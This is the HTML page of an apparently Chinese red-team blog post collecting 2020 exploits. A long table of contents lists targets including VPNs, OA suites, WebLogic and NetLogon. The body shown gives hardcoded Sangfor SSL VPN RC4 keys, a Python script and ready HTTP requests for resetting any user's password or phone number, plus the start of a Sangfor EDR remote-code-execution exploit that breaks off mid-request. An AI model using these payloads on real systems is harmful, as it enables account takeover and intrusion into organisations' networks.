<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="持续整理中… 一、安全设备1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机描述：某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码M7.6.6R1版本key为20181118M7.6.1key为20100720 利用条件：需要登录账号 12345678910111213141516#计算RC4_STR_LEN脚本from Cryp">
<meta property="og:type" content="article">
<meta property="og:title" content="2020HW漏洞合集">
<meta property="og:url" content="https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/index.html">
<meta property="og:site_name" content="R17a&#39;s blog">
<meta property="og:description" content="持续整理中… 一、安全设备1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机描述：某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码M7.6.6R1版本key为20181118M7.6.1key为20100720 利用条件：需要登录账号 12345678910111213141516#计算RC4_STR_LEN脚本from Cryp">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-09-25T01:19:01.000Z">
<meta property="article:modified_time" content="2021-01-20T02:21:11.000Z">
<meta property="article:author" content="R17a">
<meta property="article:tag" content="HW">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>2020HW漏洞合集</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/10/29/%E7%BA%A2%E9%98%9F%E6%80%9D%E8%B7%AF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/09/02/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&text=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&is_video=false&description=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2020HW漏洞合集&body=Check out this article: https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&name=2020HW漏洞合集&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&t=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、安全设备"><span class="toc-number">1.</span> <span class="toc-text">一、安全设备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机"><span class="toc-number">1.0.1.</span> <span class="toc-text">1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置"><span class="toc-number">1.0.2.</span> <span class="toc-text">2、深信服 SSL VPN Nday - Pre Auth 任意密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679"><span class="toc-number">1.0.3.</span> <span class="toc-text">3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、深信服-SSL-VPN-任意用户添加漏洞"><span class="toc-number">1.0.4.</span> <span class="toc-text">4、深信服 SSL VPN 任意用户添加漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、深信服-EDR3-2-21远程代码执行"><span class="toc-number">1.0.5.</span> <span class="toc-text">5、深信服 EDR3.2.21远程代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552"><span class="toc-number">1.0.6.</span> <span class="toc-text">6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、深信服-EDR-远程命令执行漏洞"><span class="toc-number">1.0.7.</span> <span class="toc-text">7、深信服 EDR 远程命令执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、绿盟UTS综合威胁探针管理员任意登录-密码泄露"><span class="toc-number">1.0.8.</span> <span class="toc-text">8、绿盟UTS综合威胁探针管理员任意登录&#x2F;密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、天融信TOPApp-LB负载均衡SQL注入漏洞"><span class="toc-number">1.0.9.</span> <span class="toc-text">9、天融信TOPApp-LB负载均衡SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、天融信数据防泄漏系统未授权修改管理员密码"><span class="toc-number">1.0.10.</span> <span class="toc-text">10、天融信数据防泄漏系统未授权修改管理员密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、网御星云VPN老版本漏洞"><span class="toc-number">1.0.11.</span> <span class="toc-text">11、网御星云VPN老版本漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835"><span class="toc-number">1.0.12.</span> <span class="toc-text">12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115"><span class="toc-number">1.0.13.</span> <span class="toc-text">13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14、PAN-OS远程代码执行漏洞-CVE-2020-2040"><span class="toc-number">1.0.14.</span> <span class="toc-text">14、PAN-OS远程代码执行漏洞 CVE-2020-2040</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15、联软准入文件上传漏洞"><span class="toc-number">1.0.15.</span> <span class="toc-text">15、联软准入文件上传漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、OA"><span class="toc-number">2.</span> <span class="toc-text">二、OA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、通达OA11-6未授权远程代码执行漏洞"><span class="toc-number">2.0.1.</span> <span class="toc-text">1、通达OA11.6未授权远程代码执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、通达OA11-4-越权登录漏洞"><span class="toc-number">2.0.2.</span> <span class="toc-text">2、通达OA11.4 越权登录漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、通达OA11-5-多处SQL注入漏洞"><span class="toc-number">2.0.3.</span> <span class="toc-text">3、通达OA11.5 多处SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、通达OA文件包含漏洞"><span class="toc-number">2.0.4.</span> <span class="toc-text">4、通达OA文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、用友GRP-u8-XXE-amp-SQL注入导致命令执行"><span class="toc-number">2.0.5.</span> <span class="toc-text">5、用友GRP-u8 XXE&amp;SQL注入导致命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、用友NC6-5反序列化漏洞"><span class="toc-number">2.0.6.</span> <span class="toc-text">6、用友NC6.5反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、致远A8任意文件写入文件上传漏洞"><span class="toc-number">2.0.7.</span> <span class="toc-text">7、致远A8任意文件写入文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、致远A8反序列化漏洞"><span class="toc-number">2.0.8.</span> <span class="toc-text">8、致远A8反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、泛微e-cology某版本存在RCE漏洞"><span class="toc-number">2.0.9.</span> <span class="toc-text">9、泛微e-cology某版本存在RCE漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、泛微云桥任意文件读取"><span class="toc-number">2.0.10.</span> <span class="toc-text">10、泛微云桥任意文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、中间件-容器"><span class="toc-number">3.</span> <span class="toc-text">三、中间件&#x2F;容器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Weblogic命令执行漏洞-CVE-2020-14645"><span class="toc-number">3.0.1.</span> <span class="toc-text">1、Weblogic命令执行漏洞 CVE-2020-14645</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Weblogic反序列化漏洞-CVE-2020-2551"><span class="toc-number">3.0.2.</span> <span class="toc-text">2、Weblogic反序列化漏洞 CVE-2020-2551</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Weblogic反序列化漏洞-CVE-2020-2555"><span class="toc-number">3.0.3.</span> <span class="toc-text">3、Weblogic反序列化漏洞 CVE-2020-2555</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、WebSphere远程代码执行漏洞-CVE-2020-4450"><span class="toc-number">3.0.4.</span> <span class="toc-text">4、WebSphere远程代码执行漏洞 CVE-2020-4450</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、WebSphere远程代码执行漏洞-CVE-2020-4362"><span class="toc-number">3.0.5.</span> <span class="toc-text">5、WebSphere远程代码执行漏洞 CVE-2020-4362</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643"><span class="toc-number">3.0.6.</span> <span class="toc-text">6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、Apache-Tomcat文件包含漏洞-CVE-2020-1938"><span class="toc-number">3.0.7.</span> <span class="toc-text">7、Apache Tomcat文件包含漏洞 CVE-2020-1938</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484"><span class="toc-number">3.0.8.</span> <span class="toc-text">8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660"><span class="toc-number">3.0.9.</span> <span class="toc-text">9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、框架"><span class="toc-number">4.</span> <span class="toc-text">四、框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA："><span class="toc-number">4.1.</span> <span class="toc-text">JAVA：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"><span class="toc-number">4.1.1.</span> <span class="toc-text">1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421"><span class="toc-number">4.1.2.</span> <span class="toc-text">2、Spring Framework反射型文件下载漏洞 CVE-2020-5421</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410"><span class="toc-number">4.1.3.</span> <span class="toc-text">3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF"><span class="toc-number">4.1.4.</span> <span class="toc-text">4、Spring Cloud Netflix Hystrix Dashboard SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、Apache-Cocoon-XML注入-cve-2020-11991"><span class="toc-number">4.1.5.</span> <span class="toc-text">5、Apache Cocoon XML注入 cve-2020-11991</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933"><span class="toc-number">4.1.6.</span> <span class="toc-text">6、Apache Shiro 权限绕过漏洞 CVE-2020-13933</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989"><span class="toc-number">4.1.7.</span> <span class="toc-text">7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995"><span class="toc-number">4.1.8.</span> <span class="toc-text">8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Apache-Dubbo反序列化漏洞-CVE-2020-1948"><span class="toc-number">4.1.9.</span> <span class="toc-text">9、Apache Dubbo反序列化漏洞 CVE-2020-1948</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、Apache-Dubbo反序列化漏洞-CVE-2019-1756"><span class="toc-number">4.1.10.</span> <span class="toc-text">10、Apache Dubbo反序列化漏洞 CVE-2019-1756</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、Struts2远程代码执行漏洞-CVE-2019-0230"><span class="toc-number">4.1.11.</span> <span class="toc-text">11、Struts2远程代码执行漏洞 CVE-2019-0230</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、Jackson-多个反序列化安全漏洞-CVE-2020-24616"><span class="toc-number">4.1.12.</span> <span class="toc-text">12、Jackson 多个反序列化安全漏洞 CVE-2020-24616</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、Fastjson-lt-1-2-68-远程命令执行漏洞"><span class="toc-number">4.1.13.</span> <span class="toc-text">13、Fastjson &lt;&#x3D; 1.2.68 远程命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">4.2.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、ThinkPHP-3-x注入漏洞"><span class="toc-number">4.2.1.</span> <span class="toc-text">1、ThinkPHP 3.x注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、ThinkPHP-6-任意文件操作漏洞"><span class="toc-number">4.2.2.</span> <span class="toc-text">2、ThinkPHP 6 任意文件操作漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148"><span class="toc-number">4.2.3.</span> <span class="toc-text">3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Fastadmin文件上传漏洞，危害级别：高危"><span class="toc-number">4.2.4.</span> <span class="toc-text">4、Fastadmin文件上传漏洞，危害级别：高危</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540"><span class="toc-number">4.2.5.</span> <span class="toc-text">5、thinkadmin 目录遍历&#x2F;任意文件读取 CVE-2020-25540</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、操作系统"><span class="toc-number">5.</span> <span class="toc-text">五、操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Windows-NetLogon特权提升漏洞-CVE-2020-1472"><span class="toc-number">5.0.1.</span> <span class="toc-text">1、Windows NetLogon特权提升漏洞 CVE-2020-1472</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、永恒之蓝-MS17-17010"><span class="toc-number">5.0.2.</span> <span class="toc-text">2、永恒之蓝 MS17-17010</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、数据库"><span class="toc-number">6.</span> <span class="toc-text">六、数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、redis"><span class="toc-number">6.0.1.</span> <span class="toc-text">1、redis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、hadoop"><span class="toc-number">6.0.2.</span> <span class="toc-text">2、hadoop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、mysql"><span class="toc-number">6.0.3.</span> <span class="toc-text">3、mysql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Mssql"><span class="toc-number">6.0.4.</span> <span class="toc-text">4、Mssql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、Nosql"><span class="toc-number">6.0.5.</span> <span class="toc-text">5、Nosql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">6.0.6.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、邮件"><span class="toc-number">7.</span> <span class="toc-text">七、邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Exchange"><span class="toc-number">7.0.1.</span> <span class="toc-text">1、Exchange</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、coremail"><span class="toc-number">7.0.2.</span> <span class="toc-text">2、coremail</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#八、项目管理"><span class="toc-number">8.</span> <span class="toc-text">八、项目管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、禅道"><span class="toc-number">8.0.1.</span> <span class="toc-text">1、禅道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Jira"><span class="toc-number">8.0.2.</span> <span class="toc-text">2、Jira</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更新说明："><span class="toc-number">9.</span> <span class="toc-text">更新说明：</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2020HW漏洞合集
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">R17a</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-09-25T01:19:01.000Z" itemprop="datePublished">2020-09-25</time>
        
        (Updated: <time datetime="2021-01-20T02:21:11.000Z" itemprop="dateModified">2021-01-20</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HW/">HW</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/HW/" rel="tag">HW</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>持续整理中…</p>
<h2 id="一、安全设备"><a href="#一、安全设备" class="headerlink" title="一、安全设备"></a>一、安全设备</h2><h4 id="1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机"><a href="#1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机" class="headerlink" title="1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机"></a>1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机</h4><p><strong>描述：</strong><br>某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码<br>M7.6.6R1版本key为20181118<br>M7.6.1key为20100720</p>
<p><strong>利用条件：</strong>需要登录账号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#计算RC4_STR_LEN脚本</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span>  a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myRC4</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    rc41 = ARC4.new(key)</span><br><span class="line">    encrypted = rc41.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrpt_hex</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    rc41 = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc41.decrypt(a2b_hex(data))</span><br><span class="line"></span><br><span class="line">key = <span class="string">'20100720'</span></span><br><span class="line">data = <span class="string">r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,'</span></span><br><span class="line">print(myRC4(data,key))</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">https://&lt;PATH&gt;/por/changepwd.csp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line">...</span><br><span class="line">sessReq=clusterd&amp;sessid=0&amp;str=RC4_STR&amp;len=RC4_STR_LEN(脚本计算后结果)</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）" target="_blank" rel="noopener">https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）</a></p>
<h4 id="2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置"><a href="#2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置" class="headerlink" title="2、深信服 SSL VPN Nday - Pre Auth 任意密码重置"></a>2、深信服 SSL VPN Nday - Pre Auth 任意密码重置</h4><p><strong>描述：</strong>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码</p>
<p><strong>利用条件：</strong>需要登录账号</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line">...</span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）" target="_blank" rel="noopener">https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）</a></p>
<h4 id="3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679"><a href="#3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679" class="headerlink" title="3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679"></a>3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.onebug.org&#x2F;websafe&#x2F;98922.html</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;p&#x2F;12326356.html</span><br></pre></td></tr></table></figure>

<h4 id="4、深信服-SSL-VPN-任意用户添加漏洞"><a href="#4、深信服-SSL-VPN-任意用户添加漏洞" class="headerlink" title="4、深信服 SSL VPN 任意用户添加漏洞"></a>4、深信服 SSL VPN 任意用户添加漏洞</h4><h4 id="5、深信服-EDR3-2-21远程代码执行"><a href="#5、深信服-EDR3-2-21远程代码执行" class="headerlink" title="5、深信服 EDR3.2.21远程代码执行"></a>5、深信服 EDR3.2.21远程代码执行</h4><figure class="highlight"><figcaption><span>EXP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9【访问nginx规则路径，绕过第一个检查;&#123;"md5":true&#125;的base64编码，绕过第二个检查】</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 